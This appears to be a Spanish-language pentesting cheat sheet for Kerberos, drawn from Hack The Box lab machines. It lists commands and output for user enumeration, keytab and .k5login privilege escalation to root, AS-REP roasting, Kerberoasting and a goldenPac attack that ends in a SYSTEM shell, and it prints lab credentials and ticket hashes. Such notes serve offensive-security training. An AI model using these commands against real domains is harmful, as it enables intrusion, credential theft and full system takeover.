# kerberos-88

# Kerberos - 88

## Enumeración de usuarios

```
kerbrute userenum --dc 10.10.11.175 -d outdated.htb /usr/share/wordlists/SecLists/Usernames/xato-net-10-million-usernames.txt
```

## Configuración del `krb5.conf` para el acceso por SSH

```
dpkg-reconfigure krb5-config
```

```
[libdefaults]
  default_realm = REALCORP.HTB

[realms]
  REALCORP.HTB = {
    kdc = realcorp.htb:88
    }
```

El SPN debe ser el primer host al que apuntar en el `/etc/hosts`

### Conexión

```
kinit j.nakazawa
Password for j.nakazawa@REALCORP.HTB:
```

```
ssh j.nakazawa@10.10.10.224
Activate the web console with: systemctl enable --now cockpit.socket

Last login: Thu Jan 19 12:36:51 2023 from 10.10.14.6
[j.nakazawa@srv01 ~]$
```

## Abuso de `.krlogin` para escalar privilegios (LINUX)

### Creación de archivo de configuración en el directorio personal de un usuario

Con esto se consigue que el usuario pwneado se pueda conectar como este otro proporcionando su TGT

```
[j.nakazawa@srv01 squid]$ echo 'j.nakazawa@REALCORP.HTB' > .k5login
```

### Abuso de `.keytab`

### Enumeración de TGTs proporcionado este archivo

```
[admin@srv01 /]$ klist -k /etc/krb5.keytab
```

### Sesión interactiva proporcionando SPN

```
kadmin -kt /etc/krb5.keytab -p kadmin/admin@REALCORP.HTB
```

### Creación de principal para el usuario `root`, así como su contraseña

```
kadmin:  add_principal root@REALCORP.HTB
No policy specified for root@REALCORP.HTB; defaulting to no policy
Enter password for principal "root@REALCORP.HTB":
Re-enter password for principal "root@REALCORP.HTB":
Principal "root@REALCORP.HTB" created.
```

### Shell como `root`

```
[admin@srv01 /]$ ksu
WARNING: Your password may be exposed if you enter it here and are logged
         in remotely using an unsecure (non-encrypted) channel.
Kerberos password for root@REALCORP.HTB: :
Authenticated root@REALCORP.HTB
Account root: authorization for root@REALCORP.HTB successful
Changing uid to root (0)
```

### ASPRepRoast Attack

### Obtener TGT (Don’t require preauth disable)

```
root@kali# GetNPUsers.py blackfield.local/ -no-pass -usersfile users.txt -dc-ip 10.10.10.192
$krb5asrep$23$support@BLACKFIELD.LOCAL:83f252224f04becb3108d7234f0fcd94$0f355b4ad7b813039520ec6ed1f451575c79c313a3779707b24fd8824aa74d9d4fda352599ad767167ade44f4f6a67b6e0d54016e26502ab618b0d7791a40ffc60480703a1cd6bd5ae68078ab9589a91284966a54fc6134ae52f8efc41164386e4e251b41aa09f46616d53c103216d3c3e0560c5e822937ad3b4f61527c9d4fb63664abd2888d2c379340baf682a38491978c9e63d151fc54725e969df94a34f996849c439ff6953a5c9747774d6878ff5555b8c6af1415ec3c141206c460f2d4949456f429d766072d0d348b30d642e521b14cf9cef4bc8d01da69bd3995b4019ee5bbbb024346ea7786474980ec6b1bb9d13c0
```

### Kerberoasting Attack

```
GetUserSPNs.py search.htb/hope.sharp:'IsolationIsKey?' -request
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

ServicePrincipalName               Name     MemberOf  PasswordLastSet             LastLogon  Delegation
---------------------------------  -------  --------  --------------------------  ---------  ----------
RESEARCH/web_svc.search.htb:60001  web_svc            2020-04-09 12:59:11.329031  <never>

[-] CCache file is not found. Skipping...
$krb5tgs$23$*web_svc$SEARCH.HTB$search.htb/web_svc*$207cd5eceeecff9f13668ceb3ff6d22e$b84e91ec3e58be3ceb63a3c75095e9b65640971bdd5320f3a580cb90011b78d7e3d395241df889b2bcdca56da31b6cf9f8587e350580c9aca4a8b6de3459d31b758f1e2f40a590f04987ad8ec6591c484ed182cad265ba12525b03156cadf884555f176d0cfe4a2abfe8e9d80e8fb84d82ed9530bb81a42ba6a7bcdb29abd2ddcf9e68ca82af0866533c71fc8e08a7fd568b4f9176e7f6ae8310efbae3eeee3322cd274ee43b004cf3c9492a4c7534b01689e545cad0329adfbb9acd5d85ef8e3bdf2891af381707619ec301355232a05194adfa93680b44fea7cfded422216677c6074543dc0fdd4f66af5dd3fe5aa115882d7ce89ebdbad3bc57bd08eeb5240d28b868c60aa0b76fdf0a0ebd10fd6d49ba0fdbf79b628536fe43b702b161e70b44b989e8a700d05c17dce2da9246fb7024fadeeb8f51a78206b201d27babf2931b8497a9dd32332acb3472c420a6ddb19634cf5541eb16d6cbfb67a8762ff85c241223edf5bb69d1a9c0d416c320f95c0a9e359b493f3d1c8ac0ed68df5847b73ca6432d73f1a13e03460aefd2cea543dca8b1ad78587b534e84774535fae0081764ab9a08f72d22a5e6b5ddfe19d1f0936e22a3eccabd550ec23ce33c48e7734c86d5a94abab4e3efc66670931ca6939bcf4fc4786edf4e6c4d834c4a22e9c9cc7d5c9156d6cdbf32252c2f40b146aa907a5cf464df5fd4b023d9dd13b7164e66ed1b6d754298240f073585ca7ac77fbb13ef49c191d529ad1e7867a4a1b952c97227498665871fa9854f4e5fece5ae5406a4d6c09faed44b31ed662eede072afad53d25f663b349f2e40058dfc609cc7de8c220cbea3d89f5e7c164981e167a65f5107cb81f10a08efa18af691613b98f0a6da8089afe632dbf20e9e2335da35e0c8b4f1ddbd5a985d84147d86c939581573189977e51191aeb86e12e3dc8eb534a8b0542ee7e1fd4d72b648af51c2ee935d6e9e79937e1d02a1c8c6f10dbb17fec63aad3cfcdb128f3fa8e45fd0da3eee2362b1f17384e9d50164b63041fedde744431849ee8b48a797cedadd51fb81e0b739f6ce8c94d6e46bbeb2608593ef453006359ff905df579bac36d068e44b606e69f491f9c7aa8145658a3192c958d333f0f7141f2833927f956b492b010cc4b2da790c4a1027eeeb25553d4a8e424189b3793e03b0764f804e1586082a550ff8a66cfae0e4cbae0ac6cdc8df251359f386019f7a3dd0330f6ba94e8cba8d908c1131449746cf2de9da3bc4380e1a2bfbc1d6eec376382ff4c59ce16d0a7f61320d0e350ab587bad2600e1c287cb9bf83b953a1b309f53fef55b83b90a03921cbc05419a3ac82d53b0dabc1de91c0c68a0aa7d37cbc4b4eb64187e954a1455c812a91724452595adcc9e26f1cc0c0872f05641644f4ba772cd5bf1b7b87528dd633e9cfaf1faf5fa87e6222ba040004962f587a0c177e51d47ac31752a2c82fa4d4
```

### Golden Ticket Attack

```
goldenPac.py 'htb.local/james:J@m3s_P@ssW0rd!@mantis'
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] User SID: S-1-5-21-4220043660-4019079961-2895681657-1103
[*] Forest SID: S-1-5-21-4220043660-4019079961-2895681657
[*] Attacking domain controller mantis.htb.local
[*] mantis.htb.local found vulnerable!
[*] Requesting shares on mantis.....
[*] Found writable share ADMIN$
[*] Uploading file xvCbwVPb.exe
[*] Opening SVCManager on mantis.....
[*] Creating service Jlxr on mantis.....
[*] Starting service Jlxr.....
[!] Press help for extra shell commands
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Windows\system32>whoami
nt authority\system
```